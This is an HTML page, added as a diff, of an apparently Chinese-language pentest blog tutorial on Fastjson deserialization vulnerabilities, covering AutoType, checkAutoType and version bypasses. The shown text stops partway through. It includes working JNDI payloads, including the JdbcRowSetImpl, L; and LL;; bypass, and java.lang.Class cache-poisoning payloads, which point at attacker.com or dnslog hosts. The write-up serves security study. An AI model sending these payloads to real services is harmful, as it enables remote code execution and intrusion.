@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言Fastjson 是阿里巴巴开源的高性能 JSON 解析库，广泛应用于国内外 Java 项目。自 2017 年首个反序列化漏洞披露以来，Fastjson 便成为攻防焦点——官方连续发布几十个安全版本，攻击者也不断挖掘新的 bypass。本文从 AutoType 机制出发，系统梳理漏洞原理、利用方式、版本绕过及检测方法。 一、Fastjson 基础与 AutoType 机制1.1 序列化与反序列">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fastjson漏洞从入门到精通">
+<meta property="og:url" content="https://congliang.github.io/Deserialization-fastjson/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言Fastjson 是阿里巴巴开源的高性能 JSON 解析库，广泛应用于国内外 Java 项目。自 2017 年首个反序列化漏洞披露以来，Fastjson 便成为攻防焦点——官方连续发布几十个安全版本，攻击者也不断挖掘新的 bypass。本文从 AutoType 机制出发，系统梳理漏洞原理、利用方式、版本绕过及检测方法。 一、Fastjson 基础与 AutoType 机制1.1 序列化与反序列">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-06-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.856Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="框架安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Deserialization-fastjson/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Deserialization-fastjson/","path":"Deserialization-fastjson/","title":"Fastjson漏洞从入门到精通"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Fastjson漏洞从入门到精通 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Fastjson-%E5%9F%BA%E7%A1%80%E4%B8%8E-AutoType-%E6%9C%BA%E5%88%B6"><span class="nav-number">2.</span> <span class="nav-text">一、Fastjson 基础与 AutoType 机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 序列化与反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-SerializerFeature-WriteClassName"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 SerializerFeature.WriteClassName</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-AutoType-%E6%9C%BA%E5%88%B6"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 AutoType 机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%BF%83%E8%84%8F%EF%BC%9AcheckAutoType"><span class="nav-number">3.</span> <span class="nav-text">二、漏洞心脏：checkAutoType</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%89%88%E6%9C%AC%E6%BC%94%E5%8F%98%E4%B8%8E-Bypass-%E5%8E%86%E5%8F%B2"><span class="nav-number">4.</span> <span class="nav-text">三、版本演变与 Bypass 历史</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Fastjson"><span class="nav-number">4.1.</span> <span class="nav-text">3.1 Fastjson &lt;&#x3D; 1.2.24：黄金时代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Fastjson-1-2-25-1-2-43%EF%BC%9A%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87%E6%97%B6%E4%BB%A3"><span class="nav-number">4.2.</span> <span class="nav-text">3.2 Fastjson 1.2.25 - 1.2.43：字符绕过时代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-Fastjson-1-2-44-1-2-46%EF%BC%9A%E9%BB%91%E5%90%8D%E5%8D%95%E6%89%A9%E5%85%85"><span class="nav-number">4.3.</span> <span class="nav-text">3.3 Fastjson 1.2.44 - 1.2.46：黑名单扩充</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-Fastjson-1-2-47%EF%BC%9A%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87%EF%BC%88%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92%EF%BC%89"><span class="nav-number">4.4.</span> <span class="nav-text">3.4 Fastjson 1.2.47：通用绕过（缓存投毒）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-Fastjson-1-2-48-1-2-68%EF%BC%9A%E7%BC%93%E5%AD%98%E4%BF%AE%E8%A1%A5%E4%B8%8E-expectClass"><span class="nav-number">4.5.</span> <span class="nav-text">3.5 Fastjson 1.2.48 - 1.2.68：缓存修补与 expectClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-Fastjson-1-2-69-1-2-83%EF%BC%9A%E5%90%8E-AutoType-%E6%97%B6%E4%BB%A3"><span class="nav-number">4.6.</span> <span class="nav-text">3.6 Fastjson 1.2.69 - 1.2.83：后 AutoType 时代</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E6%A0%B8%E5%BF%83%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-number">5.</span> <span class="nav-text">四、核心利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-JNDI-%E6%B3%A8%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">4.1 JNDI 注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-JDBC-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.2.</span> <span class="nav-text">4.2 JDBC 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-3-TemplatesImpl-%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%88%E4%B8%8D%E5%87%BA%E7%BD%91%EF%BC%89"><span class="nav-number">5.3.</span> <span class="nav-text">4.3 TemplatesImpl 字节码执行（不出网）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%9C%AC%E5%9C%B0-Gadget-Chain"><span class="nav-number">5.4.</span> <span class="nav-text">4.4 本地 Gadget Chain</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81DNSLog-%E6%A3%80%E6%B5%8B"><span class="nav-number">6.</span> <span class="nav-text">五、DNSLog 检测</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%A3%80%E6%B5%8B-Payload"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 检测 Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E6%A3%80%E6%B5%8B%E6%B5%81%E7%A8%8B"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 检测流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8E%A2%E6%B5%8B%E8%84%9A%E6%9C%AC"><span class="nav-number">6.3.</span> <span class="nav-text">5.3 自动化探测脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8"><span class="nav-number">7.</span> <span class="nav-text">六、不出网利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-%E5%86%99%E6%96%87%E4%BB%B6%E8%8E%B7%E5%8F%96-WebShell"><span class="nav-number">7.1.</span> <span class="nav-text">6.1 写文件获取 WebShell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">7.2.</span> <span class="nav-text">6.2 时间盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="nav-number">7.3.</span> <span class="nav-text">6.3 内存马注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="nav-number">8.</span> <span class="nav-text">七、防御与修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">八、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E5%BD%95%EF%BC%9A%E7%89%88%E6%9C%AC%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%E8%A1%A8"><span class="nav-number">10.</span> <span class="nav-text">附录：版本与利用总结表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">11.</span> <span class="nav-text">免责声明</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Deserialization-fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Fastjson漏洞从入门到精通 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fastjson漏洞从入门到精通
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-06-01 08:00:00" itemprop="dateCreated datePublished" datetime="2026-06-01T08:00:00+08:00">2026-06-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fastjson 是阿里巴巴开源的高性能 JSON 解析库，广泛应用于国内外 Java 项目。自 2017 年首个反序列化漏洞披露以来，Fastjson 便成为攻防焦点——官方连续发布几十个安全版本，攻击者也不断挖掘新的 bypass。本文从 AutoType 机制出发，系统梳理漏洞原理、利用方式、版本绕过及检测方法。</p>
+<h2 id="一、Fastjson-基础与-AutoType-机制"><a href="#一、Fastjson-基础与-AutoType-机制" class="headerlink" title="一、Fastjson 基础与 AutoType 机制"></a>一、Fastjson 基础与 AutoType 机制</h2><h3 id="1-1-序列化与反序列化"><a href="#1-1-序列化与反序列化" class="headerlink" title="1.1 序列化与反序列化"></a>1.1 序列化与反序列化</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line"><span class="comment">// &#123;&quot;password&quot;:&quot;123456&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="type">JSONObject</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(json);           <span class="comment">// 不指定类型</span></span><br><span class="line"><span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> JSON.parseObject(json, User.class);       <span class="comment">// 指定类型</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-SerializerFeature-WriteClassName"><a href="#1-2-SerializerFeature-WriteClassName" class="headerlink" title="1.2 SerializerFeature.WriteClassName"></a>1.2 SerializerFeature.WriteClassName</h3><p>开启 <code>WriteClassName</code> 后，序列化 JSON 会携带 <code>@type</code> 字段：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line"><span class="comment">// &#123;&quot;@type&quot;:&quot;com.example.User&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-AutoType-机制"><a href="#1-3-AutoType-机制" class="headerlink" title="1.3 AutoType 机制"></a>1.3 AutoType 机制</h3><p>当 <code>@type</code> 存在时，Fastjson 通过 <code>Class.forName()</code> 或 <code>TypeUtils.loadClass()</code> 动态加载指定类并调用其 setter&#x2F;getter。这一机制允许攻击者指定任意类触发恶意代码执行。</p>
+<p><strong>AutoType 工作流程：</strong></p>
+<pre class="mermaid">flowchart TD
+    A["JSON.parseObject(json)"] --> B{"JSON 是否包含 @type ?"}
+    B -->|是| C["提取 @type 指定的类名"]
+    C --> D{"checkAutoType() 校验"}
+    D -->|通过| E["Class.forName 加载类"]
+    E --> F["调用 setter/getter 填充属性"]
+    F --> G["构造对象返回"]
+    D -->|拒绝| H["抛出异常, 中断解析"]
+    B -->|否| I["视为普通 JSONObject 解析"]
+    I --> G</pre>
+
+<h2 id="二、漏洞心脏：checkAutoType"><a href="#二、漏洞心脏：checkAutoType" class="headerlink" title="二、漏洞心脏：checkAutoType"></a>二、漏洞心脏：checkAutoType</h2><p><code>checkAutoType</code> 位于 <code>ParserConfig</code> 中，对 <code>@type</code> 的类名进行白名单&#x2F;黑名单校验：</p>
+<ul>
+<li><strong>白名单 (acceptList)</strong>：允许直接加载的类。</li>
+<li><strong>黑名单 (denyList)</strong>：禁止加载的危险类（如 <code>JdbcRowSetImpl</code>）。</li>
+<li><strong>autoTypeSupport</strong>：全局开关，1.2.25 引入，默认 <code>false</code>。</li>
+</ul>
+<p>攻防双方围绕 <code>checkAutoType</code> 展开了持续多年的对抗——每次黑名单修补都伴随着新的 bypass。</p>
+<h2 id="三、版本演变与-Bypass-历史"><a href="#三、版本演变与-Bypass-历史" class="headerlink" title="三、版本演变与 Bypass 历史"></a>三、版本演变与 Bypass 历史</h2><h3 id="3-1-Fastjson"><a href="#3-1-Fastjson" class="headerlink" title="3.1 Fastjson &lt;&#x3D; 1.2.24：黄金时代"></a>3.1 Fastjson &lt;&#x3D; 1.2.24：黄金时代</h3><p>没有 <code>checkAutoType</code>，任何危险类均可直接利用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 经典 JdbcRowSetImpl Payload</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">  <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://attacker.com/Exploit&quot;</span>,</span><br><span class="line">  <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>setAutoCommit(true)</code> 触发 JNDI lookup，连接恶意 LDAP&#x2F;RMI 服务器加载远程字节码执行命令。</p>
+<h3 id="3-2-Fastjson-1-2-25-1-2-43：字符绕过时代"><a href="#3-2-Fastjson-1-2-25-1-2-43：字符绕过时代" class="headerlink" title="3.2 Fastjson 1.2.25 - 1.2.43：字符绕过时代"></a>3.2 Fastjson 1.2.25 - 1.2.43：字符绕过时代</h3><table>
+<thead>
+<tr>
+<th>版本</th>
+<th>绕过技术</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1.2.25</td>
+<td>L; 包裹</td>
+<td>类名前加 <code>L</code> 后加 <code>;</code> 绕过黑名单字符串匹配</td>
+</tr>
+<tr>
+<td>1.2.41</td>
+<td>L; 去壳</td>
+<td><code>TypeUtils.loadClass</code> 加载前自动去除外层 <code>L...;</code></td>
+</tr>
+<tr>
+<td>1.2.42</td>
+<td>LL;; 双写</td>
+<td>双写 <code>LL</code>+<code>;;</code>，逐层剥离后恢复原始类名</td>
+</tr>
+<tr>
+<td>1.2.43</td>
+<td><code>[{</code> 绕过</td>
+<td><code>[</code> 开头触发数组解析，绕过类名校验</td>
+</tr>
+</tbody></table>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.2.41 绕过</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>, <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.dnslog.cn/Exp&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1.2.42 双写绕过</span></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>: <span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>, <span class="string">&quot;dataSourceName&quot;</span>: <span class="string">&quot;ldap://x.dnslog.cn/Exp&quot;</span>, <span class="string">&quot;autoCommit&quot;</span>: <span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-Fastjson-1-2-44-1-2-46：黑名单扩充"><a href="#3-3-Fastjson-1-2-44-1-2-46：黑名单扩充" class="headerlink" title="3.3 Fastjson 1.2.44 - 1.2.46：黑名单扩充"></a>3.3 Fastjson 1.2.44 - 1.2.46：黑名单扩充</h3><p>官方修复双写绕过后，攻击者转向不在黑名单中的新利用链：</p>
+<ul>
+<li><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code> — MyBatis JNDI 注入</li>
+<li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> — <code>_bytecodes</code> 加载恶意字节码</li>
+</ul>
+<h3 id="3-4-Fastjson-1-2-47：通用绕过（缓存投毒）"><a href="#3-4-Fastjson-1-2-47：通用绕过（缓存投毒）" class="headerlink" title="3.4 Fastjson 1.2.47：通用绕过（缓存投毒）"></a>3.4 Fastjson 1.2.47：通用绕过（缓存投毒）</h3><p>利用 <code>java.lang.Class</code> 将恶意类名写入 <code>mappings</code> 缓存，后续 <code>checkAutoType</code> 直接从缓存命中，<strong>完全绕过黑名单</strong>：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;a&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span> <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://attacker.com/Exploit&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<pre class="mermaid">flowchart LR
+    A["第1部分: java.lang.Class"] --> B["checkAutoType 放行基础类"]
+    B --> C["将恶意类加载到 mapping 缓存"]
+    C --> D["第2部分: 恶意类名"]
+    D --> E{"checkAutoType 查询缓存"}
+    E -->|"缓存命中"| F["绕过黑名单 → loadClass → RCE"]</pre>
+
+<h3 id="3-5-Fastjson-1-2-48-1-2-68：缓存修补与-expectClass"><a href="#3-5-Fastjson-1-2-48-1-2-68：缓存修补与-expectClass" class="headerlink" title="3.5 Fastjson 1.2.48 - 1.2.68：缓存修补与 expectClass"></a>3.5 Fastjson 1.2.48 - 1.2.68：缓存修补与 expectClass</h3><p><strong>修补：</strong> <code>mappings</code> 缓存安全控制、<code>expectClass</code> 限制反序列化类型、黑名单持续扩充。</p>
+<p><strong>绕过：</strong></p>
+<ul>
+<li><code>Throwable</code> 继承链：<code>ErrorBase</code> 子类的 <code>getMessage()</code> 触发 <code>InitialContext.lookup()</code></li>
+<li><code>AutoCloseable</code> 利用链：实现 <code>AutoCloseable</code> 接口的类可被自动调用 <code>close()</code></li>
+</ul>
+<h3 id="3-6-Fastjson-1-2-69-1-2-83：后-AutoType-时代"><a href="#3-6-Fastjson-1-2-69-1-2-83：后-AutoType-时代" class="headerlink" title="3.6 Fastjson 1.2.69 - 1.2.83：后 AutoType 时代"></a>3.6 Fastjson 1.2.69 - 1.2.83：后 AutoType 时代</h3><ul>
